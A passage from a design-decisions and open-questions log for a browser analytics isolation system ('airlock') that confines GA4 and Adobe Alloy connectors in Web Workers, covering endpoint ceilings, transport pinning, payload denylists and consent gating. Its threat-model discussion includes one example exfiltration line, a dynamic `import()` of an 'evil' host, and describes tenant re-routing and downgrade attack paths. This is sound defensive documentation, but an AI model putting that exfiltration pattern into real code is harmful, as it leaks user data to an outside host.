**Resolved — (d) the blanket `eslint-disable` + linting adoption ([spec 021-03](specs/021-mvp4-hardening/slice-03-eslint-scope.md), 2026-08-31):** the 012-01 (d) craft residual assumed a linter already existed (from the AEM/Airbnb-flavoured disable comments); grounding at implementation found **none was ever wired** in this repo. Resolved by **adopting** ESLint (user direction "add the linter now") — flat `eslint.config.js` on `@eslint/js` **recommended**, `npm run lint` + a CI `Lint (eslint)` gate — and **removing** the whole-file `/* eslint-disable */` from `connectors/alloy/alloy-chamber.worker.js` outright (not narrowing it: under `recommended` the stock-Alloy-hosting worker needs **no** disables — only 2 trivial `no-useless-escape` were auto-fixed). The other 012-01 (d) sub-items (dead-man fetch guard, fetch-shim timeout) were resolved earlier (014-01). See [conventions.md § Code style](conventions.md) + [lightweight-decisions 2026-08-31](decisions/lightweight-decisions.md).
**Resolved — protocol-blindness / transport pin ([spec 021-02](specs/021-mvp4-hardening/slice-02-transport-pin.md), 2026-08-31):** grounded first (AC1, superseding the ADR-0004 pointer above): the 016 endpoint-ceiling already HOLDS an `http://` downgrade wherever it is CO-WIRED with config-integrity (`checkEndpointCeiling`'s `origin` comparison includes the scheme) — confirmed by an executable test (`test/wrapped-sdk-host.test.js`'s ceiling-wired case: the downgrade is held by `endpoint-ceiling`, and config-integrity never even runs). But `createWrappedSdkHost` also ships a SUPPORTED, tested configuration where config-integrity runs STANDALONE with no ceiling co-wired (`runConfigIntegrity = configIntegrity && (!endpointCeiling || …)`; the 015-01/015-02 describe blocks and the 016-02 composition suite's own case (f) — "015 standalone, unweakened" — all wire `configIntegrity` with no `endpointCeiling` key) — there the scheme-blindness was a real, uncaught gap, not a hypothetical. **Fix (defense-in-depth, landed IN `core/config-integrity.js` itself — not the ADR-0004 egress allow-list the original 015-02 review pointed at; the grounding found the more targeted, correct location given the ceiling-less path):** `checkConfigIntegrity` now checks the outbound URL's SCHEME against the pin's own expected transport (`pin.pinnedScheme`, defaulting to `https:` — every shipped pin targets a real Adobe/GA host, so this closes the gap for every existing caller with zero wiring changes) and HOLDS on a mismatch (disposition-neutral reason naming the "transport downgrade" — rides an override alert without contradicting it, same discipline as the other reasons); `pinnedDispatchUrl`'s override re-derive now also re-derives the SCHEME to the pin, so a downgrade can't survive a "corrected" re-point either. **Origin-aware, not hardcoded https** (mirrors 014-01's `reconcileForBrokerJar`, which drops Secure/SameSite rather than hardcoding them because a plain http/localhost jar would reject a Secure cookie outright): a caller legitimately pointed at a localhost/http test origin declares its own `pinnedScheme: "http:"` and is not force-upgraded — the rule is scheme MATCH against the pin's expected transport, not "must be https literally". Tests: `test/alloy-config-integrity.test.js` + `test/wrapped-sdk-host.test.js` (standalone http-downgrade held; already-held-by-the-ceiling when co-wired, confirming (b)/(c); override re-derives to https; the honest https path AND a localhost/http `pinnedScheme:"http:"` pin both unaffected).
**Delivered — GA4 chamber confinement + wire-protocol endpoint ceiling ([spec 016-01](specs/016-mvp3-endpoint-ceiling-enforcement/slice-01-ga4-wire-protocol-ceiling.md), 2026-08-30):** the GA4 chamber is now egress-CONFINED (`core/egress-confinement.js`'s `applyEgressConfinement`, relocated from `connectors/alloy/` and extended with an `opts.withholdFetch` mode — GA4's egress is the `ready` postMessage, not a mediated fetch, so `fetch` is WITHHELD, the INVERSE of alloy's `fetchPreserved` invariant) AND a generic, vendor-neutral `core/endpoint-ceiling.js` (origin+pathname ∈ the connector's declared endpoints, else HOLD + a 009-02 `endpoint-ceiling` alert) is wired into `core/airlock.js`'s async worker dispatch seam. **The ordering fix is the load-bearing part:** because the GA4 chamber is a `type:"module"` worker that statically imports its connector, and ES-module evaluation is post-order, confinement could not run from `chamber.worker.js`'s own body/init handler (a compromised connector's top-level `const f = self.fetch` would already have captured the live fetch by then) — it runs instead as `core/confine-ga4-chamber.js`, a side-effecting module imported FIRST, above the connector imports, so by source-order its top-level (and thus confinement) evaluates first. **Three residuals named, not closed, by this slice:** (1) **tenant-in-query re-route** — the ceiling drops the query (by design, ADR-0006 Kill #4), so a compromised chamber posting to the declared GA4 origin+path with an attacker's `measurement_id` is allowed; this is `core/config-integrity.js`'s (spec 015) job and is explicitly **deferred for GA4** (015-01 scoped it to alloy's `configId` only — a GA4 config-integrity pin is unbuilt). (2) **dynamic `import()`** — a `type:"module"` worker's `await import("https://evil/x")` exfiltrates via the specifier fetch itself, a language-level loader primitive no JS shim (confinement included) can withhold; carried from `core/egress-confinement.js`'s spec-012-01 AC5 disclosure, gated by a worker `connect-src` CSP where the host controls response headers, not by this slice. (3) **multi-chamber per-connector attribution** — `EgressRequest` (`contracts/connector.d.ts`) carries no connector/chamber id, so the ceiling's ability to bind "these declared endpoints belong to THIS chamber" holds only in the current single-connector-per-host model; a multi-chamber host would need an attribution channel this slice does not add. **016-02** (alloy: wrapped-SDK endpoint ceiling reconciled with config-integrity) is the sibling slice for the CDP archetype.
**Delivered — alloy wrapped-SDK endpoint ceiling reconciled with config-integrity ([spec 016-02](specs/016-mvp3-endpoint-ceiling-enforcement/slice-02-alloy-wrapped-sdk-floor.md), 2026-08-30):** the 016-01 control (`checkEndpointCeiling`, origin+pathname) is reused at alloy's already-confined wrapped-SDK dispatch seam (`core/wrapped-sdk-host.js`'s `dispatchInterceptedFetch`), reconciled with 015's config-integrity onto non-overlapping axes — the ceiling runs FIRST on every intercepted egress (owns host+path, closing the path-confinement gap config-integrity's host-only check leaves open); config-integrity's tenant check is scoped to run only when there is no ceiling OR the destination host equals its own `pinnedHost` (015's control code stays byte-unchanged; its no-ceiling standalone tests, in `test/wrapped-sdk-host.test.js` and `test/alloy-config-integrity.test.js`, stay green). The single grounded interact origin (`adobedc.demdex.net/ee/v1/interact`) is declared as the enforced FLOOR, and the 012-04 boundary sentinel (`test/alloy-manifest-declaration.test.js`) is flipped from asserting an *absence* of gating to asserting the ceiling's *presence* (undeclared → hold, declared → allow). **Three residuals tracked, not closed:** (1) **multi-tenant-pin model** — admitting a second tenant-keyed declared origin (e.g. a same-`/ee/`-family Edge host) safely needs config-integrity extended from a single `{pinnedHost, tenantKey, pinnedTenant}` to a `host → pinned-tenant` SET, so each declared origin gets its own tenant check instead of being tenant-blind — the composition-seam's named gap, demonstrated + surfaced (never silently opened) via a `config-integrity: unpinned-declared-origin` diagnostic whenever both controls are wired and a dispatch lands on a declared non-`pinnedHost` origin; (2) **chamber-grounded egress probe** — a real-Edge run THROUGH THE CONFINED CHAMBER (not 013-02's real-DOM main-thread reference run) measuring actual origins + paths + which carry a `configId`-equivalent tenant key, which must **precede** expanding alloy's declared endpoint set beyond the single interact floor (ADR-0006 Kill #2 — the server-directed/wildcard criterion this slice deliberately left unresolved); (3) **dynamic host-mediated sync allowlist** — the demdex/AAM server-directed sync URLs the Edge response returns at runtime cannot be enumerated by any static declaration; whether a runtime-updated, host-mediated allowlist (keyed off a trusted Edge-response field) can safely admit them without reopening the ceiling to attacker steering is an open design question, not attempted here. **Spec 016 is now complete** (016-01 GA4 + 016-02 alloy).

### ~~OQ10 — Egress dispatch and delivery model (incl. last-beacon)~~ — RESOLVED 2026-08-26
~~**Deferred:** [ADR-0002](decisions/adr-0002-event-descriptor-cycle-semantics.md) deliberately stops at the worker boundary; the whole egress model is one coupled decision adversarial review showed cannot be settled by argument. It spans **dispatch location** (worker-side eager and off the INP path but needing a two-sender dedup/ack and a consent snapshot, vs orchestrator-side main-thread and capability-mediated but requiring idle-gating), **delivery under interaction-storm load** (idle-gated main-thread dispatch stalls and builds an undeliverable backlog; eager worker dispatch avoids it), the **aggregate 64 KiB keepalive budget** (Chrome 255/9 caps) that limits the end-of-session flush, and the **unload / last-beacon path**. The canonical last beacon — an outbound click or closing pageview generated *within* the unload window — cannot complete an async worker round-trip to be mapped before the page is torn down, so it is absent from the un-sent requests the unload flush dispatches. Rescuing it needs a main-thread **synchronous mapping fast path** for a declared set of unload-critical event types, which cuts against "mapping stays worker-side" and must honor ADR-0003's out-of-chamber minimization. Shared by egress Option B too (it also maps in the worker), so the Option-B fallback does not retire it.~~
**Resolution trigger:** With the risk-retirement spike, which must measure the INP-versus-delivery tension directly (an INP oracle alone is insufficient; a delivery-rate oracle is needed). The delivery-rate oracle must instrument the **drain stage** too, not just worker egress: the idle-gated main→worker drain (frozen in ADR-0002) itself caps delivery under no-idle load — it either drops-oldest before events reach the worker, or fires on its max-latency cap and runs structured-clone serialization during the storm — so worker-side egress cannot rescue events the drain never delivered, and a number measuring only egress would attribute drain-induced loss to the wrong stage. Record in a dedicated egress ADR. Load-bearing for UC-2 analytics correctness.
**Measured (spike 003, 2026-08-26):** the delivery risk is real — a worker-only keepalive egress delivered 155/300 beacons when the page closed before the worker drained (9s of off-thread work), vs 300/300 with a normal settle; main-thread naive/deferred paths delivered 300/300. So the egress model must backstop delivery on the main thread at `visibilitychange`→`hidden`.
**Closed (2026-08-26):** the main-thread synchronous mapping fast path is implemented (`core/egress.js` `createCriticalDispatcher`; `pushCritical()` + the `visibilitychange`/`pagehide` ring-tail flush in `core/airlock.js`) and re-measured (`rig/teardown.mjs`): the enqueued last beacon is lost in the teardown window (0/5) while `pushCritical` delivers it (5/5) and the ring-tail flush delivers the un-drained tail (50/50), with steady-state INP p75 unchanged at 8ms. Unit-tested (`test/egress-fastpath.test.js`, contract-conformant). The decision is recorded in **ADR-0004**, which extends ADR-0002's deferred egress section. One residual facet (in-worker backlog under *extreme* early close) is parked in ADR-0004 Open questions, not part of OQ10's last-beacon scope.
**Resolved by:** [ADR-0004: Egress dispatch and delivery model](decisions/adr-0004-egress-dispatch-delivery.md).

### ~~OQ11 — Event-payload read-boundary governance~~ — RESOLVED 2026-08-30
~~**Deferred:** [ADR-0003](decisions/adr-0003-projection-snapshot-privacy.md) governs the projection-snapshot read channel (default-deny allowlist). The event-payload channel (the connector's primary input) is open and site-defined — UC-2 custom events, `push()` open object, OQ3 emergent schema — so a field-allowlist collapses to a wildcard (= default-allow). It needs a different model: a host-owned **sensitive-field denylist** that strips known-dangerous fields (raw form inputs, declared PII paths) at the boundary outside the connector's chamber, optionally tightened to an allowlist if OQ3 pins a schema.~~
**Resolution trigger:** With the connector interface contract at drive-order step 5; resolve jointly with **OQ3** (schema pin vs emergent). Record via ADR.
**Resolved by:** [ADR-0012: Event-payload read-boundary governance (OQ11)](decisions/adr-0012-payload-governance.md).
**Implemented — [spec 019-01](specs/019-payload-governance/slice-01-payload-denylist.md), 2026-08-31:** a host-owned INPUT-side sensitive-field denylist ([`core/payload-governance.js`](../core/payload-governance.js) `governPayload` — vendor-neutral, import-free, pure) stripped BEFORE the chamber at BOTH governance points in `core/airlock.js` — a single `sendBatch` chokepoint (drain + flushNow) and the shared sync dispatcher (pushCritical + unloadFlush), so a future async consumer cannot silently bypass it. **Non-mutating** (copy-on-write along denied dotted paths — the local event log/projection keep the raw field, machine-proven). A denied field is provably absent from the GA4 MP body at all three crossings (input≈egress: `map.js` spreads `params`). The tiny built-in default (`password`/`ssn`/`cvv`/card-number family) is **ALWAYS-ON** (maintainer decision 2026-08-31 — the footgun population is the unconfigured one; near-no-op for real payloads), extended by a host `payloadDenylist` option (threaded through `adapters/eds/index.js`); back-compat holds in CONTENT (a clean payload is byte- + reference-identical). **Every** case-variant is stripped (`password`+`Password` — a craft-review value-leak fix); a fail-open on a hostile getter is surfaced (error-level diagnostic), not silent; stripped fields emit a redacted 009-02 diagnostic (field NAME only, never the value). Match semantics pinned (bare = top-level, dotted = nested leaf, case-insensitive, exact) — resolving ADR-0012's own match-semantics open question. **Still open (named residuals):** (a) **alloy-INPUT governance** — a deferred SECOND placement binding the same `governPayload` at the separate `core/wrapped-sdk-host.js` input seam (`chamber.postMessage({type:"event"})`), which neither GA4 chokepoint touches — NOT "governed for free" (ADR-0012 §3 annotated with this correction); (b) alloy **ambient in-chamber collection** (read-minimization, not this channel); (c) the **egress-side XDM strip** (ADR-0012 Option B, alloy vendor body, probe-first); (d) an **OQ3 allowlist tightening** (if OQ3 pins a schema, this seam tightens denylist→allowlist); (e) **value-level PII** in a benign-named field (ADR-0003's projection-side value governance); (f) `contracts/connector.d.ts:39-44`'s OQ11 "pass-through for MVP1 only" comment is now stale for GA4.

### OQ12 — `push()`-surface contract completion — RESOLVED (items 1–3 + `workFactor` 2026-08-27 via 004-04; item 4 2026-08-31 via 021-01) — COMPLETE
**Deferred (original):** Slice 004-02's reviews surfaced four small contract/robustness items around the now-reconciled `push()` surface, none blocking that slice: (1) **`pushCritical`'s caller-facing shape is pinned in no contract doc** — it shares `push()`'s `{ event, ...params }` shape by design (implemented + tested), and the **`push()`-XOR-`pushCritical` caller rule** (ADR-0004: violation silently double-counts) is likewise unpinned; both belong in `contracts/push-api.md`. (2) **Malformed-push behavior** (missing/empty/non-string `event` → drop + `console.warn`, never throw — mirrors `push-event.schema.json`) is a runtime-side clarification the contract doc is silent on. (3) **`getState()` returns the live projection by reference** (contract-consistent per its 🟡 not-a-deep-clone row) — the write-through hazard deserves one contract sentence. (4) **Dispose / idempotent-boot guard**: `createAirlock` registers global unload listeners with no teardown and `bootEdsAnalytics` overwrites `window.airlock`; once-per-page on EDS so accepted, but a library distribution needs a guard. Also: prune the spike's `workFactor` knob from the adapter options, and `pushCritical` bypasses the event log/projection (sent-but-unrecorded; couples to ADR-0004's parked idempotency guard, which wants a descriptor the fast path never creates).
**Resolved (slice 004-04, 2026-08-27):** items **1–3** pinned into [contracts/push-api.md](../contracts/push-api.md) — a `pushCritical()` subsection (its `{event,...params}` shape, synchronous, fire-and-forget keepalive, bypasses the log+projection, the aggregate-keepalive-budget drop behavior) + Supported-table row; the **push()-XOR-`pushCritical`** caller-rule callout; the `getState()`-returns-live-projection-by-reference note; and the malformed-push behavior is covered. The spike's **`workFactor`** knob is **pruned** from `adapters/eds/index.js` (arch review 004-04; the rigs that need it call `createAirlock` directly).
**Resolved — item 4 ([spec 021-01](specs/021-mvp4-hardening/slice-01-dispose-idempotent-boot.md), 2026-08-31):** `createAirlock`'s returned handle gains **`dispose()`** — the `visibilitychange`/`pagehide` listeners now carry NAMED references (not anonymous inline fns) so `dispose()` can `removeEventListener` them, and it calls `worker.terminate()`. Idempotent (a `disposed` guard makes a second call a no-op) and null-safe (no `addEventListener`/`removeEventListener` global, or a Worker with no `.terminate`, both silently skip rather than throw). `adapters/eds/index.js`'s `bootEdsAnalytics` is now **idempotent**: a second boot on a page that already has `window.airlock` disposes the prior instance first (`window.airlock.dispose()`) before installing the new one — dispose-prior-then-reboot, never a stacked second Worker + second unload-listener set. The single-boot path is byte-unchanged (additive only). **OQ12 is now fully resolved** (items 1–4 + `workFactor` all closed). The `pushCritical` log/projection bypass / ADR-0004 parked idempotency guard noted alongside the original item 4 remains a SEPARATE, still-open concern (not part of this dispose/re-boot guard) — not tracked under any open OQ number here; worth a fresh entry if it becomes actionable.

### OQ13 — Identity-cookie follow-ups (post-004-03 review residue) — item 1 RESOLVED 2026-08-30 (017-02); items 2–5 open
**Deferred (original):** Slice 004-03 shipped host-side GA4 identity sourcing (`_ga` parse; GA1-format generate+persist; per-page session fallback) and its reviews parked five follow-ups, none blocking that slice: (1) **Consent-gating the identity-cookie write** — the seal gates egress only (AD-9); the first-party `_ga` write is consent-ungated in MVP1 (fine on the consent-free testbed; a privacy-positioned deployment wants the write behind consent state too). (2) **Session-cookie persistence** — on a gtag-free site nothing writes `_ga_<stream>`, so an MPA mints a fresh session per page; deciding whether/what airlock persists for sessions is deliberately NOT in 004-03. (3) **Multi-stream `_ga_*` selection policy** — current policy is first-in-jar-order wins (documented in `connectors/ga4/cookies.js`); also open: whether the capability shape grows a `list()` for chamber-side discovery or discovery stays a host duty feeding ctx. (4) **Name-scoped cookie grant wrapper** — `adapters/eds/cookies.js` is the RAW whole-jar host backing (JSDoc caveat added); before any connector grant it needs a default-deny name-scope wrapper per `CapabilityRequest.cookies`, with the cookie **name validated** on `set` (attribute-injection surface), and its likely eventual home is `core/` per capability.d.ts's "backed by the orchestrator". Two accepted behaviors ride with this item: a `SecurityError` in cookie-blocked/sandboxed contexts currently degrades to a **visible boot failure** (`__airlockBootFailed`) rather than a null-identity boot — revisit toward graceful null-identity when the wrapper lands; and whether the init-time identity ctx eventually folds into the **ADR-0003 declaration mechanism** (a manifest declaring `clientId`/`sessionId` needs) or stays host-composed. (5) **Pair-scan loop duplication** (adapter accessor vs connector parser) — rule-of-three: extract on a third copy.
**Resolved (slice [017-02](specs/017-mvp3-purpose-vector-consent/slice-02-storage-deny.md), 2026-08-30):** item **1** — the identity **READ+WRITE** (not just the write; the frame-critique's load-bearing correction) now gates on `analytics_storage` (ADR-0007 point ②). `sourceGa4Ctx` (`connectors/ga4/cookies.js`) takes a `storageGranted` opt, threaded from `adapters/eds/index.js` (`consent ? resolveConsent(consent, "analytics_storage") === "granted" : true`). Not granted (denied OR pending) -> mint a **fresh ephemeral** `client_id` unconditionally, **never reading** an existing persisted `_ga` (reading-and-using it would itself be using denied storage — the leak a write-only gate would have shipped, closed here) — and force `session_id` to the per-page fallback, never reading `_ga_<stream>`. **Back-compat preserved:** `storageGranted` defaults `true`, so a caller with no consent vector wired at all (or an explicit `"granted"`) keeps 004-03's byte-identical always-persist flow. Tested (`test/ga4-cookies.test.js`), incl. the pre-existing-`_ga` leak case asserting the jar's `get` is never even called.
**Still open — items 2–5:** (2) **Session-cookie persistence** — on a gtag-free site nothing writes `_ga_<stream>`, so an MPA mints a fresh session per page; deciding whether/what airlock persists for sessions is deliberately NOT in 004-03 or 017-02. (3) **Multi-stream `_ga_*` selection policy** — current policy is first-in-jar-order wins (documented in `connectors/ga4/cookies.js`); also open: whether the capability shape grows a `list()` for chamber-side discovery or discovery stays a host duty feeding ctx. (4) **Name-scoped cookie grant wrapper** — `adapters/eds/cookies.js` is the RAW whole-jar host backing (JSDoc caveat added); before any connector grant it needs a default-deny name-scope wrapper per `CapabilityRequest.cookies`, with the cookie **name validated** on `set` (attribute-injection surface), and its likely eventual home is `core/` per capability.d.ts's "backed by the orchestrator". Two accepted behaviors ride with this item: a `SecurityError` in cookie-blocked/sandboxed contexts currently degrades to a **visible boot failure** (`__airlockBootFailed`) rather than a null-identity boot — revisit toward graceful null-identity when the wrapper lands; and whether the init-time identity ctx eventually folds into the **ADR-0003 declaration mechanism** (a manifest declaring `clientId`/`sessionId` needs) or stays host-composed. (5) **Pair-scan loop duplication** (adapter accessor vs connector parser) — rule-of-three: extract on a third copy.
**Resolution trigger:** (2) before an MPA field deployment where per-page sessions would visibly inflate session counts (UC-2 rollout). (3)+(4) with the first connector-requested cookie grant (OQ9/MVP2 capability work). (5) mechanical, on the third copy.

## Architecture — resolved at vision level (2026-08-25)

> These were wizard-deferred "no signal" items; the seeded design docs now carry the signal. Vision-level direction is set; implementation-level specifics (version pins, exact interfaces) still land with the first code spec + an ADR.

### Decision: Tech stack — RESOLVED (vision level)
**Was deferred:** No signal from the initial pitch about runtime, language, framework, or platform.
**Now:** product-vision § Stack + architecture § Tech stack specify vanilla **ES modules** (no runtime framework), **Web Workers** (batched `postMessage`, structured clone; deliberately no SharedArrayBuffer / COOP-COEP), egress via `fetch(url, { keepalive: true })`, `PerformanceObserver` for diagnostics, **vitest** for tests, **GA4 Measurement Protocol** as the external validatable contract. Reuses `ramboz/aem-cwv-helper` primitives.
**Remaining:** version pins and lint/build config — set by the first code spec (see Conventions below).

### Decision: Module boundaries — RESOLVED (vision level)
**Was deferred:** No modules yet — boundaries become explicit when the first contract is defined.
**Now:** architecture § Module boundaries + § Repository structure define the capture layer / orchestrator / worker runtime / airlock capability bridge / two seams, and the `core/` `adapters/eds/` `connectors/*` `diagnostics/` `test/` layout.
**Remaining:** formal interface contracts (connector interface, capability API, seam drivers) — pin via `/jig:contracts` before implementation (drive-order step 5).

## Conventions

### ~~Decision: Code style and linting~~ — RESOLVED 2026-08-31 (spec 021-03)
~~**Deferred:** No signal from the initial pitch. (Still open.)~~
**Resolution trigger:** First spec that produces non-trivial code, or first time inconsistency causes friction.
**Resolved (spec 021-03, user direction "add the linter now"):** ESLint 10 flat config
(`eslint.config.js`) on the `@eslint/js` **recommended** baseline; `npm run lint` + a CI `Lint (eslint)`
step gate on it. Per-env globals by glob (browser / worker / node / vitest); `probes/` + `rig/out/` ignored;
whole-file `/* eslint-disable */` disallowed (the `alloy-chamber.worker.js` blanket was removed, not narrowed —
under `recommended` the file needs no disables). `recommended` chosen over AEM/Airbnb deliberately (real-bug
ruleset, no style-cleanup avalanche); the stricter ruleset stays a deferred option. See
[conventions.md § Code style](conventions.md) + [lightweight-decisions.md](decisions/lightweight-decisions.md).

### Decision: Testing framework — RESOLVED (vitest)
**Was deferred:** No signal from the initial pitch.
**Now:** **vitest**, per product-vision § Stack and architecture § Tech stack. Servo-scored oracle components live under `test/`.
**Landed (spec 007):** vitest config (`vitest.config.js` + `vitest.oracle.config.js`) and the oracle components. Per [ADR-0005](decisions/adr-0005-oracle-design.md), the three are **not** all `oracle.sh` `COMPONENTS` entries: only **`ga4_mp_conformance`** is a hermetic servo-unattended gating component (`oracle.sh`); **`isolation_invariant`** is a real-Worker browser-CI rig (`npm run rig:isolation`, gates the CI job, not the composite); **`cwv_budget`** is a jig-supervised **advisory** invocation (`npm run cwv:budget`, never in `COMPONENTS`). Do not add `cwv_budget`/`isolation_invariant` to the gating array.

## Operations

### ~~Decision: CI/CD setup~~ — RESOLVED 2026-08-27 (spec 007)
~~**Deferred:** No CI configured (scaffolded with `--no-ci`).~~
**Resolution trigger:** First spec that crosses a deploy boundary; also required before servo unattended loops can run the GA4 conformance oracle in CI (drive-order step 9, GA4 route).
**Resolved (spec 007-04 + 007-05):** `.github/workflows/ci.yml` runs two jobs on
every push/PR, credential-free (no secrets), routed per
[ADR-0005](decisions/adr-0005-oracle-design.md):
- **`hermetic-oracle`** (07-04): `npm ci` + `npm test` + `npm run test:oracle`
  (the `ga4_mp_conformance` gate-flip proof) + the `contracts` validator — the
  fast, browser-free hermetic gate.
- **`browser-oracle`** (07-05): installs Playwright/chromium; **gates** on
  `rig:isolation` (07-02) + `rig:uc1` (flicker); runs `cwv_budget` **advisory**
  (`continue-on-error`); uploads the CWV scoreboard + OQ6 challenger screenshot
  as artifacts. A separate job, so a chromium-install failure never blocks the
  hermetic gate.
**Caveat:** verified **offline** — YAML valid, all step commands green locally,
seeded-regression demos red→restored, `act -n` reached Docker-not-running. **A
live GitHub Actions run has NOT been executed;** the first push should confirm
the "job appears in Actions and completes" observable (spec A2).

## Spec 008 (GA4 purchase) follow-ups — surfaced by the 008 design review (2026-08-27)

### OQ14 — Chamber-side isolation of a throwing mapper — ⚠️ PULLED INTO MVP1 2026-08-27 (→ spec 009)
**Scope:** Pulled into MVP1 scope 2026-08-27 ([mvp1.md](releases/mvp1.md) Cutline)
— a core ADR-0001 chamber-isolation guarantee that is stated but not
implemented, not a purchase-specific nicety. To be closed by **spec 009**.
**Deferred:** Spec 008 makes `mapToMp` **throw** on a contract-invalid `purchase`
(the first throwing path in the mapper). But its worker caller
[`core/chamber.worker.js`](../../core/chamber.worker.js) runs the map inside
`self.onmessage` with **no try/catch**, and [`core/airlock.js`](../../core/airlock.js)
registers `worker.onmessage` with **no `worker.onerror`**. So an uncaught throw
never reaches `self.postMessage({ ready })` — the **entire cycle's batch (all
events × all trackers) is lost silently**, which is *worse* than the
unattributed conversion 008 prevents, and contradicts `architecture.md` Q1's
chamber-isolation contract ("drop/restart just the failing chamber; other
chambers and the page unaffected"). Throwing from the pure mapper is only
defensible if the caller catches **per event**.
**Resolution trigger:** Before wiring real `purchase` traffic. Fix belongs in
the caller/airlock (per-event try/catch + `worker.onerror`), out of 008's
`map.js`-only surface. Related to OQ9 (MVP2 chamber isolation).

### ~~OQ15 — `ga4_mp_conformance` does not cover `purchase` (schema can't represent `items[]`)~~ — RESOLVED 2026-08-27 (spec 010-01)
**Resolved by spec 010-01:** `ga4-mp-request.schema.json` now models `items[]`
(a `$defs/item` array, ≥1 of `item_id`/`item_name`), a `ga4-mp-purchase.golden`
fixture is in the validator's `mustPass`, and 5 item-shape negative controls are
in `mustFail` — so `score_ga4_mp_conformance` covers the purchase conversion like
every other event. Contract doc: `contracts/ga4-mp.md` "Ecommerce `items[]`".
**Scope:** Pulled into MVP1 scope 2026-08-27 ([mvp1.md](releases/mvp1.md) Cutline)
— extends the hermetic conformance oracle to the key conversion event. Closed by
**spec 010**.
**Deferred:** The pinned
[`contracts/ga4-mp-request.schema.json`](../../contracts/ga4-mp-request.schema.json)
restricts `params` values to `anyOf[string, number, boolean]`, so an ecommerce
`items[]` **array-of-objects is rejected by the contract**, and there is **no
`ga4-mp-purchase.golden.json` fixture**. So the hermetic conformance oracle never
validated the key conversion event, and a *valid* purchase body produced by
`mapToMp` would fail its own pinned schema. Spec 008's premise ("the generic
mapping already conforms") was corrected in its Non-goals.
**Resolution trigger:** When the purchase route needs servo-unattended
conformance coverage — add an ecommerce `items` shape to the schema + a purchase
golden fixture (then `ga4_mp_conformance` gates purchase like the other events).
Interacts with OQ3 (vendor-neutral schema now vs emergent).

### OQ16 — Isolation of a throwing mapper on the unload/critical (main-thread) egress path
**Deferred:** Spec 009-01 isolates a throwing `mapToMp` on the **worker** cycle
path (`core/chamber.worker.js` `mapBatch`). But the OQ10 unload fast path maps
+ dispatches **synchronously on the main thread** — `core/airlock.js`
`unloadFlush` → `createCriticalDispatcher` (`core/egress.js`) — and does **not**
route through `mapBatch`, so a throwing descriptor (e.g. a malformed `purchase`)
in the `visibilitychange`→`hidden` window has **undefined isolation** on the
critical path: the throw would propagate in the unload handler, potentially
losing the whole last-beacon flush. Surfaced by the 009-01 arch review.
**Resolution trigger:** Before real `purchase` traffic uses the unload/critical
path — mirror `mapBatch`'s per-descriptor try/catch (or route the critical map
through the same guarded helper) in `core/egress.js`'s critical dispatcher.
Related to OQ14 (this is the same containment guarantee at a second seam) and
OQ10 (the egress model).

## Spec 017-01 (data-use consent reshape + the consent machinery) follow-ups

**Delivered (2026-08-30):** `core/consent.js` (vendor-neutral ADR-0007 taxonomy +
`resolveConsent`) and `connectors/ga4/consent.js` (`shapeMpConsent`, the GA4
data-use → MP `consent`-object shaping) are folded into `ctx` PRE-`createAirlock`
in `adapters/eds/index.js`, so a denied `ad_user_data`/`ad_personalization`
reaches the MP `consent` body field at BOTH mapping sites (the worker's
`mapToMp` and the sync fast path's `core/egress.js`) — see
[slice-01](specs/017-mvp3-purpose-vector-consent/slice-01-data-use-reshape.md).
Named follow-ups from this slice, not attempted here:

- **Mid-session consent update.** The 017-01 seam is boot-time/pre-construction
  only (AC6): the worker's `ctx` is a frozen structured-clone snapshot taken at
  `init`, so a consent change arriving mid-session cannot reach it via the
  current `ctx` fold alone. Honoring it needs (a) a NEW worker message type —
  `core/airlock.js` currently only speaks `init`/`events` — carrying a `ctx`
  (or consent-delta) re-send, and (b) per-purpose replay/stop semantics (ADR-0007
  Open questions: on grant, replay *pending*-held events per Q2's
  flush-on-arrival; on revoke, stop future egress for that purpose —
  already-sent cannot be unsent). A post-construction `setConsent(...)` handle
  method alone is NOT sufficient — it would reach only the sync path's live
  `ctx` reference, never the already-cloned worker `ctx` (017-01 frame-critique).
  **Partially resolved by [017-03](specs/017-mvp3-purpose-vector-consent/slice-03-seal-hold-drop.md),
  2026-08-30** — see that slice's own follow-ups section below: the SEAL side
  (hold-pending -> flush-on-arrival) now has its own main-thread `setConsent`;
  the worker `ctx` re-send this bullet describes is specifically for the
  mapper's *reshape* ① and remains open.
- **Consent-Mode `gtag` / TCF `__tcfapi` seam drivers.** ADR-0007 names these as
  drivers onto the SAME pre-construction consent-input seam `adapters/eds/index.js`
  now folds through (a host-provided vector today); a `gtag('consent', …)`
  listener or a `__tcfapi` bridge would source that same vector, not replace the
  seam. Neither driver is built.
- **Alloy / wrapped-SDK consent.** 017-01 shapes only the GA4 Measurement-Protocol
  `consent` body field; Alloy's XDM body has its own vendor consent shape
  (Adobe Experience Platform's `consent` array on the XDM event / `setConsent`
  API), unaddressed by this slice's GA4-specific shaper. A wrapped-SDK consent
  reshape is a separate follow-up, parallel to `connectors/ga4/consent.js` but
  reading Alloy's own vendor shape.
- **Google Consent Mode semantic detail.** ADR-0007's Assumptions flag that the
  *transport split* (MP `consent` object vs gtag's gcs/gcd) is repo-grounded,
  but the exact current semantics of `ad_user_data`/`ad_personalization` under
  Google's Consent Mode v2 docs were not re-verified against Google's live
  documentation as part of this slice — a wrong or aged semantic detail there is
  a driver revision, not a structural bet, but should be checked before this
  reshape is relied on for real compliance posture.

## Spec 017-03 (seal hold-pending + strict-drop) follow-ups — spec 017 COMPLETE

**Delivered (2026-08-30):** the THIRD ADR-0007 enforcement point — the seal
(point ③) — now holds a beacon whose governing purpose (the connector's
declared `purposes.egress`, e.g. GA4 -> `analytics_storage`) resolves
**pending**, at the async `worker.onmessage` dispatch seam in
`core/airlock.js` (`core/consent.js`'s new vendor-neutral `egressVerdict`),
composed BEFORE 016-01's endpoint ceiling. This slice builds its OWN
main-thread consent-update path — a mutable `consentVector` + the returned
handle's `setConsent(vector)` — DISTINCT from 017-01's still-deferred worker
`ctx` re-send: held beacons are already-mapped `{ url, body }`, so a flush on
a pending→granted edge is a pure main-thread re-`fetch`, no worker round-trip
and no re-map. A declared **strict** regime (a boot property on the `consent`
input — ADR-0007 leaves *where* the regime is declared an open question; this
slice picked the simplest available option, not a pinned seam contract) drops
an un-granted beacon outright instead of holding it. The sync/unload fast
path (`pushCritical` + the `unloadFlush` ring tail) can only DROP, never hold
— there is no "later" at teardown to flush to. `adapters/eds/index.js` wires
GA4's `["analytics_storage"]` purpose into `egressPurposes`, gated on
`opts.consent` being provided at all (mirroring 017-01/017-02's own
`consent ? … : …` back-compat idiom) — see
